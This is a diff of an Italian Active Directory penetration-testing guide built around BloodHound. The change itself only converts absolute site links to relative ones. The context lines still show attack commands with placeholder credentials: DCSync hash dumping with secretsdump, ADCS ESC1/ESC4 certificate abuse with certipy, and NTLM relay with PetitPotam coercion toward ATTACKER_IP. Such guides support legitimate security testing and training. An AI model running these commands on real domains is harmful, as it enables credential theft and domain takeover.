@@ -327,7 +327,7 @@ Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity attack
 impacket-secretsdump DOMINIO/attacker:'Password'@DC_IP -just-dc-ntlm
 ```
 
-→ Vedi [DCSync](https://hackita.it/articoli/dcsync/)
+→ Vedi [DCSync](/articoli/dcsync/)
 
 ### WriteOwner
 
@@ -350,7 +350,7 @@ net rpc password "TARGET_USER" "NewPass123!" -U "DOMINIO/attacker%Password" -S D
 evil-winrm -i SRV01 -u attacker -p 'Password'
 ```
 
-→ Vedi [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/) | [Mimikatz](https://hackita.it/articoli/mimikatz/)
+→ Vedi [Pass-the-Hash](/articoli/pass-the-hash/) | [Mimikatz](/articoli/mimikatz/)
 
 ### DCSync Rights
 
@@ -358,7 +358,7 @@ evil-winrm -i SRV01 -u attacker -p 'Password'
 impacket-secretsdump DOMINIO/attacker:'Password'@DC_IP -just-dc-ntlm
 ```
 
-→ Vedi [DCSync](https://hackita.it/articoli/dcsync/) | [Kerberos](https://hackita.it/articoli/kerberos/)
+→ Vedi [DCSync](/articoli/dcsync/) | [Kerberos](/articoli/kerberos/)
 
 ### Unconstrained Delegation
 
@@ -366,7 +366,7 @@ impacket-secretsdump DOMINIO/attacker:'Password'@DC_IP -just-dc-ntlm
 Rubeus.exe monitor /interval:5 /nowrap
 ```
 
-→ Vedi [Rubeus](https://hackita.it/articoli/rubeus/)
+→ Vedi [Rubeus](/articoli/rubeus/)
 
 ### ReadLAPSPassword / AllExtendedRights
 
@@ -418,7 +418,7 @@ certipy shadow auto -u attacker@corp.local -p 'Password' -account TARGET -dc-ip 
 
 ## BloodHound e Active Directory Certificate Services (ADCS)
 
-BloodHound CE ha integrazione nativa con ADCS. In quasi ogni assessment AD moderno, i template ADCS vulnerabili sono tra i percorsi più veloci verso Domain Admin. Per una copertura completa di tutti gli ESC da 1 a 16 vedi [ADCS ESC1–ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).
+BloodHound CE ha integrazione nativa con ADCS. In quasi ogni assessment AD moderno, i template ADCS vulnerabili sono tra i percorsi più veloci verso Domain Admin. Per una copertura completa di tutti gli ESC da 1 a 16 vedi [ADCS ESC1–ESC16](/articoli/adcs-esc1-esc16/).
 
 ### ESC1 — Template con SAN controllabile
 
@@ -428,7 +428,7 @@ certipy req -u attacker@corp.local -p 'Password' -ca CA_NAME -template TEMPLATE_
 certipy auth -pfx administrator.pfx -dc-ip DC_IP
 ```
 
-→ Vedi [ESC1](https://hackita.it/articoli/esc1-adcs/)
+→ Vedi [ESC1](/articoli/esc1-adcs/)
 
 ### ESC4 — WriteProperty sul template
 
@@ -437,7 +437,7 @@ certipy template -u attacker@corp.local -p 'Password' -template TEMPLATE -save-o
 # Poi sfrutta come ESC1
 ```
 
-→ Vedi [ESC4](https://hackita.it/articoli/esc4-adcs/)
+→ Vedi [ESC4](/articoli/esc4-adcs/)
 
 ### ESC8 — NTLM Relay verso Web Enrollment
 
@@ -446,11 +446,11 @@ impacket-ntlmrelayx -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --t
 python3 PetitPotam.py ATTACKER_IP DC_IP
 ```
 
-→ Vedi [ESC8](https://hackita.it/articoli/esc8-adcs/)
+→ Vedi [ESC8](/articoli/esc8-adcs/)
 
 ### ESC13 — Group-Linked Template Abuse
 
-→ Vedi [ESC13](https://hackita.it/articoli/esc13-adcs/)
+→ Vedi [ESC13](/articoli/esc13-adcs/)
 
 ***
 
@@ -552,7 +552,7 @@ evil-winrm -i 10.10.10.20 -u j.smith -p 'Pass123!'
 
 **4. Dump credenziali sessione svc\_sql**
 
-→ Vedi [Mimikatz](https://hackita.it/articoli/mimikatz/) | [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/)
+→ Vedi [Mimikatz](/articoli/mimikatz/) | [Pass-the-Hash](/articoli/pass-the-hash/)
 
 **5. DCSync finale**
 
